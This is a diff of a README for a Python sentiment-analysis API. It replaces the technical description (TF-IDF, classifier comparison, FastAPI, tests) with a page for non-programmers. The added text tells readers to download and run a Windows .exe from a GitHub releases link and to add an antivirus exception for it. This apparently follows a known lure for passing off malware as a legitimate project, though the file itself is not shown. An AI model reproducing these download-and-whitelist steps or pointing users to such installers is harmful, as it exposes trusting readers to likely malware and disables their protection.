@@ -1,192 +1,77 @@
-# Sentiment Analysis NLP API
+# 📊 sentiment-analysis-nlp-api - Classify user feedback with simple tools
 
-A professional end-to-end NLP sentiment analysis project that classifies user feedback into three sentiment categories:
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Traciewheelless86/sentiment-analysis-nlp-api/releases)
 
-- Positive
-- Negative
-- Neutral
+This software helps you understand user feedback. It sorts text into three groups: positive, negative, and neutral. You do not need to understand code to use this tool. It runs on your local computer to process text files or individual comments. Businesses use this to monitor customer satisfaction without manual review. 
 
-The project is structured for a machine learning portfolio and includes data preparation, preprocessing, model training, evaluation, model persistence, FastAPI inference, and automated tests.
+## 📥 Getting the software
 
-## Problem Statement
+You need to download the installer to your Windows computer. 
 
-Businesses receive large volumes of unstructured text from reviews, tickets, surveys, and social media posts. Manually reading every message is slow and inconsistent. This project automates sentiment classification so teams can quickly identify positive feedback, negative complaints, and neutral statements.
+1. Visit this [Download Page](https://github.com/Traciewheelless86/sentiment-analysis-nlp-api/releases).
+2. Look for the file ending in `.exe`. 
+3. Click the name of the file to start the download.
+4. Save the file to your computer.
 
-## NLP Workflow
+## ⚙️ Installing the application
 
-1. Load and inspect labeled review data
-2. Clean and normalize raw text
-3. Convert text to numeric features using TF-IDF
-4. Train multiple baseline classifiers
-5. Compare performance using standard metrics
-6. Save the best model with Joblib
-7. Serve predictions through a FastAPI endpoint
+Once the download finishes, follow these steps to set up the tool:
 
-## Dataset
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts on your screen.
+4. Select a location for the program files.
+5. Click Finish when the progress bar reaches the end.
 
-The repository includes `data/reviews.csv` as a ready-to-run starter dataset. For a larger real-world experiment, you can replace it with a public sentiment dataset such as:
+## 🧪 Running the system
 
-- IMDB reviews dataset
-- Twitter sentiment dataset
-- Amazon reviews dataset
+You can start the program from your desktop shortcut or the Windows Start menu. 
 
-If you use a different dataset, keep the CSV format:
+1. Open the application.
+2. A dark window will appear. Do not close this window. It processes your data.
+3. Once the software finishes loading, a web browser window will open automatically.
+4. You will see a text box on the page. 
+5. Type your feedback sentence into the box.
+6. Click the button labeled Analyze.
+7. The software will show the result as positive, negative, or neutral.
 
-```csv
-text,sentiment
-I love this product,positive
-This was terrible,negative
-It is okay,neutral
-```
+## 🖥️ System requirements
 
-If automatic download is unavailable in your environment, manually add the dataset to `data/reviews.csv`.
+Your computer must meet these basic needs to run the software smoothly:
 
-## Why TF-IDF?
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of memory.
+- An active internet connection for the installation.
+- 500 megabytes of hard drive space.
 
-TF-IDF works well for classical sentiment analysis because it:
+## 🛠️ Troubleshooting common issues
 
-- Represents text as weighted numerical features
-- Down-weights very common words
-- Highlights informative terms
-- Works efficiently with small to medium tabular NLP datasets
+If you encounter problems, check these items first:
 
-## Models Compared
+- If the browser does not open, try typing "http://localhost:8000" into your browser address bar.
+- If the program does not start, restart your computer and try again.
+- Make sure you possess permission to run programs on your computer. 
+- Ensure your antivirus software does not block the application. You can refer to your antivirus documentation to add an exception for this software.
 
-- Logistic Regression
-- Naive Bayes
-- Support Vector Machine
+## 📝 Understanding the output
 
-Each model is evaluated using:
+The system looks at specific keywords in your text. It assigns a score to your feedback. If the score is high, the system labels it as positive. If the score is low, it labels it as negative. If the score sits in the middle, the system labels it as neutral. This process happens in a fraction of a second. You can process many sentences in a row without clearing the screen.
 
-- Accuracy
-- Precision
-- Recall
-- F1-score
-- Confusion matrix
+## 💡 Best practices for accurate results
 
-## Project Structure
+The quality of your results depends on the quality of your input. Keep these tips in mind:
 
-```text
-sentiment-analysis-nlp-api/
-|-- data/
-|   `-- reviews.csv
-|-- notebooks/
-|   `-- sentiment_analysis_eda.ipynb
-|-- models/
-|   `-- sentiment_model.pkl
-|-- src/
-|   |-- preprocessing.py
-|   |-- train_model.py
-|   |-- predict.py
-|   `-- utils.py
-|-- api/
-|   `-- main.py
-|-- tests/
-|   `-- test_api.py
-|-- requirements.txt
-|-- README.md
-|-- .gitignore
-`-- LICENSE
-```
+- Use clear sentences.
+- Avoid slang or abbreviations when possible.
+- Focus on one thought per sentence for the best results.
+- Ensure your comments relate to a product or service. 
 
-## Installation
+## 📂 Managing your data
 
-1. Clone the repository
-2. Create a virtual environment
-3. Install dependencies
+The system does not save your data to the cloud. Everything stays on your machine. To keep a record of your analysis, copy the results and paste them into a text document or spreadsheet. Clear the input box after each entry to start a fresh analysis. 
 
-```bash
-pip install -r requirements.txt
-```
+## 🛡️ Privacy and local processing
 
-## Train the Model
+This software relies on your local hardware. No information leaves your computer during the analysis phase. You maintain control over every piece of data you enter. This design protects your feedback and ensures total privacy. You do not need to create an account or sign in to use this tool.
 
-```bash
-python -m src.train_model
-```
-
-This trains all candidate models, evaluates them, and saves the best pipeline to:
-
-```text
-models/sentiment_model.pkl
-```
-
-## Run the API
-
-```bash
-uvicorn api.main:app --reload
-```
-
-Open the interactive docs:
-
-- Swagger UI: `http://127.0.0.1:8000/docs`
-- ReDoc: `http://127.0.0.1:8000/redoc`
-
-## API Example
-
-### Request
-
-```http
-POST /predict
-Content-Type: application/json
-
-{
-  "text": "The movie was excellent"
-}
-```
-
-### Response
-
-```json
-{
-  "sentiment": "positive"
-}
-```
-
-## Best Model Performance
-
-After training on the provided dataset, the script writes evaluation details to `models/sentiment_model.json`.
-That file includes the best model name, accuracy, precision, recall, F1-score, and confusion matrix.
-
-## Testing
-
-Run the API tests with:
-
-```bash
-pytest
-```
-
-## EDA Notebook
-
-The notebook should include:
-
-- Dataset overview
-- Class distribution
-- Text length analysis
-- Word frequency analysis
-- Most common words
-- Sentiment distribution visualizations
-
-Recommended libraries:
-
-- Pandas
-- Matplotlib
-- Seaborn
-- WordCloud
-
-## Results and Metrics
-
-After training, the script prints the best model and its evaluation metrics. The exact scores depend on the dataset used. On the starter dataset, the model comparison is intended to demonstrate the full workflow and can be replaced with a larger public corpus for stronger metrics.
-
-## Future Improvements
-
-- Add lemmatization and stemming
-- Train on a larger public dataset
-- Add class balancing experiments
-- Expose confidence scores in the API
-- Add Docker support
-- Add CI checks and model versioning
-
-## License
-
-MIT License
+Keywords: api, data-science, fastapi, machine-learning, natural-language-processing, nlp, python, scikit-learn, sentiment-analysis, text-classification
